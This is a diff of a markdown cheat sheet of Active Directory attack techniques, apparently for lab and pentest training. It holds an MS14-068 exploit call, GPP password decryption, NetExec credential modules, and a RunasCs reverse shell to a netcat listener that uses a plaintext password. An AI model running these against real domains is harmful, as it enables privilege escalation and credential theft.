@@ -112,8 +112,10 @@ sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 
 nxc smb ip -u username -p pwd -M printerbug -o LISTENER=ip
 ```
 ### Abusing MS14-068 to domain admin
+```
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek  
-ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>  
+ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>
+```
 ### Enumerating DNS Records
 ```
 adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
@@ -127,22 +129,17 @@ Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.De
 Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 ```
 ### Abusing Group Policy Preferences (GPP) Passwords
->When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
-Map drives (drives.xml)
-Create local users
-Create printer config files (printers.xml)
-Creating and updating services (services.xml)
-Creating scheduled tasks (scheduledtasks.xml)
-Changing local admin passwords.
-These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
->This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
 Groups.xml  
-<img width="2802" height="414" alt="image" src="https://github.com/user-attachments/assets/fc4e7943-9881-494c-a29c-61e4f3ddbf64" />  
+<img width="2802" height="414" alt="image" src="https://github.com/user-attachments/assets/fc4e7943-9881-494c-a29c-61e4f3ddbf64" />
+If you retrieve the cpassword value more manually, the gpp-decrypt utility can be used to decrypt the password as follows:
+```
 gpp-decrypt "value of Cpassword attribute"
+```
 ```powershell
 nxc smb ip -u username -p pwd -M gpp_autologin
 nxc smb ip -u username -p pwd -M gpp_password
 ```
+
 ### Abusing GPO (Group Policy Object)
 Check:
 ```
@@ -164,8 +161,6 @@ gpupdate /force
 rlwrap nc -nlvp 464
 .\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' cmd.exe -r 10.10.14.4:464
 ```
-
-
 
 ### Dump the local password hash and domain cached hash
 ```
